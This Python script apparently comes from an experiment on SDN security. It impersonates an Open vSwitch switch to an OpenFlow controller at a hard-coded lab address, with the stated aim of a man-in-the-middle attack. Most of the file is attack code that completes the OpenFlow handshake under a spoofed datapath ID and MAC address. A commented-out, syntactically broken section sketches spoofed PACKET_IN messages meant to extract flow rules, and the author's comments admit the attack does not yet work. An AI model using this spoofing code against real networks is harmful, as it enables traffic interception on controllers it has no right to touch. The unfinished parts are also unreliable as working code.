# Node 32 —> Node 42: Using switch spoofing to launch a man in the middle (MiTM) attack

# Plan: This attack requires the attacker to be connected to thee controller network and know the dPid
# and hw address of the target switch. Here, the attack does a legitimate handsake, and proceeds 
# to give the controller a feature request and recieves the flow mod rule.

# It may be possible to extend this to change port configurations and all.
# currently I'm having an issue with null role so the switch isn't connecting and booting thee other...

# i don't know if traffic in the network would be routed to this controller, but it is possible??
# would need a successfull handshake and the controller to try to actually route packets from other
# hosts through the switch? If I can succesfully get a spoof, then I could test it



import scapy.contrib.openflow as of
import socket
import time
import sys

dIP="192.168.56.102"
dPort=6633
hw_addr = '\xf6\x57\x65\x65\xb8\x42'

dPid = int(('\x00\x00'+hw_addr).encode('hex'), 16)


#Create socket connection and get switch hello.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((dIP,dPort))
print("Sent: connect")
resp=s.recv(2048)
if resp ==b'':
	raise RuntimeError("socket connection broken")
print('Received: ' + repr(resp))

#Reply to the hello with switch hello
to_send = of.raw(of.OFPTHello())
sent = s.send(to_send)
print("Sent:     " + repr(to_send))

# Get feature request
resp=s.recv(2048)
if resp ==b'':
	raise RuntimeError("socket connection broken")
print("Received: " + repr(resp))

# send feature reply
n_buffers = 256
n_tables = 255
capabilities = ["FLOW_STATS", "TABLE_STATS", "PORT_STATS", "QUEUE_STATS", "ARP_MATCH_IP"]
FlagsField = ["OFPAT_OUTPUT", "OFPAT_SET_VLAN_VID", "OFPAT_SET_VLAN_PCP", "OFPAT_STRIP_VLAN", \
	"OFPAT_SET_DL_SRC", "OFPAT_SET_DL_DST", "OFPAT_SET_NW_SRC", "OFPAT_SET_NW_DST", \
	"OFPAT_SET_NW_TOS", "OFPAT_SET_TP_SRC", "OFPAT_SET_TP_DST", "OFPAT_ENQUEUE"]


ports = of.OFPPhyPort(port_no=65534, hw_addr=hw_addr, port_name="s1")#, state="LINK_DOWN")

print("PORTS: " + repr(of.raw(ports)))

to_send = of.raw(of.OFPTFeaturesReply(datapath_id= dPid, n_buffers=n_buffers, n_tables=n_tables, \
	capabilities=capabilities, actions=FlagsField, ports=ports))


sent = s.send(to_send)
if sent == 0:
	raise RuntimeError("socket connection broken")
print("Sent:     " + repr(to_send))

# get set_config OFPT_GET_CONFIG_REQUEST
resp = s.recv(2048)
if resp ==b'':
	raise RuntimeError("socket connection broken")
print("Received: " + repr(resp))


# Send get_config reply
to_send = of.raw(of.OFPTGetConfigReply(miss_send_len=65535))
sent = s.send(to_send)
if sent == 0:
	raise RuntimeError("socket connection broken")
print("Sent:     " + repr(to_send))

resp = s.recv(2048)
if resp ==b'':
	raise RuntimeError("socket connection broken")
print("Received: " + repr(resp))

# Send Stats reply
to_send = of.raw(of.OFPTStatsReplyDesc(mfr_desc="Nicira, Inc", hw_desc="Open vSwitch", sw_desc="1.9.3", serial_num="None", dp_desc="None"))
sent = s.send(to_send)
if sent == 0:
	raise RuntimeError("socket connection broken")
print("Sent:     " + repr(to_send))

resp = s.recv(2048)
if resp ==b'':
	raise RuntimeError("socket connection broken")
print("Received: " + repr(resp))


#Send in spoofed packet in request with dummy packet

# # example packet captured from within mininet between h1 and h2 in --topo tree,depth=1
# data = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x45\xc0\x00\x3c\x93\x15\x40\x00\x40\x06\xa8\xe4\x7f\x00\x00\x01\x7f\x00\x00\x01\xb5\x54\x19\xe9\xb4\x71\xf4\xf9\x99\x66\x52\x18\x80\x18\x01\x56\xfe\x30\x00\x00\x01\x01\x08\x0a\x00\x2b\xbf\x38\x00\x2b\xba\x56\x01\x02\x00\x08\x00\x00\x00\x00'

# ofp_header_version = '\x01' #1B
# ofp_header_type = ofp_type.OFPT_PACKET_IN.value #1B
# ofp_header_length = '\x14' #2B, 20B total len 
# ofp_heaer_xid = '\x00'*4 #4B

# ofp_packet_in_buffer_id = '\xff\xff\xff\xff' # 4B used to identify the packet. This isn't used by the controller for packet processing so can be set arbitrarily by the switch
# ofp_packet_in_total_len = -;
# ofp_packet_in_in_port = ; #can be spoofed
# ofp_packet_in_reason = '\x01' # Reason no matching flow
# ofp_packet_in_pad = '\x00'
# ofp_packet_in_data = data #this may not be properly aligned

# to_send = (ofp_header_version + ofp_header_type + ofp_header_length + ofp_heaer_xid + 
# 	ofp_packet_in_buffer_id + ofp_packet_in_total_len + ofp_packet_in_in_port + ofp_packet_in_reason +
# 	ofp_packet_in_pad + ofp_packet_in_data)
# sent = s.send(to_send)
# print("Sent:     " + repr(to_send))


# # controlleer would ideally givee back the flow rule associated with the packet
# resp = s.recv(2048)
# if resp ==b'':
# 	raise RuntimeError("socket connection broken")
# print("Received:" + repr(resp))
# print(repr(resp))
